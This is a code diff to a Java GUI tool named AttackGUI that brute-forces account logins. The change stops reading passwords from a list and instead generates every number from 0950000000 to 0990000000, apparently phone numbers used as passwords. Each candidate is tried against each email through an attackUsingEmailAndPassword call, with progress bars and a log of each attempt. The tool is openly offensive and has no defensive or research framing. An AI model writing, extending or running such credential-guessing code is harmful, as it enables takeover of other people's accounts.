@@ -17,9 +17,12 @@ public class AttackGUI extends JFrame {
 
     private List<String> emails;
     private List<String> passwords;
-    private int i = 0, j = 0;
+    private int i = 0;
     private boolean isRunning = false;
     private DecimalFormat dcf = new DecimalFormat("###.###");
+    private long head = 950000000L;
+    private long tail = 990000000L;
+    private long j = head;
     private int index = 0;
 
     public AttackGUI(List<String> emails,
@@ -102,19 +105,19 @@ public class AttackGUI extends JFrame {
 
     private void processAttack() {
         isRunning = true;
-        if (i >= emails.size() && j >= passwords.size()) {
+        if (i >= emails.size() && j > tail) {
             writeLog("Finish attack...");
             timer.cancel();
             return;
         }
-        if (j >= passwords.size()) {
-            j = 0;
+        if (j > tail) {
+            j = head;
             i++;
         }
 
-        if (i < emails.size() && j < passwords.size()) {
+        if (i < emails.size() && j < tail) {
             double emailPercent = i * 1.0 / (emails.size() - 1) * 100;
-            double passwordPercent = j * 1.0 / (passwords.size() - 1) * 100;
+            double passwordPercent = j * 1.0 / (tail - 1) * 100;
 
             progressEmail.setValue((int) emailPercent);
             progressEmail.setString(dcf.format(emailPercent) + "%");
@@ -123,7 +126,7 @@ public class AttackGUI extends JFrame {
             progressPassword.setString(dcf.format(passwordPercent) + "%");
 
             String email = emails.get(i);
-            String password = passwords.get(j);
+            String password = "0" + j;
             writeLog(email + ":" + password + " [" + (j + 1) + "]");
 
             attackUsingEmailAndPassword(email, password);
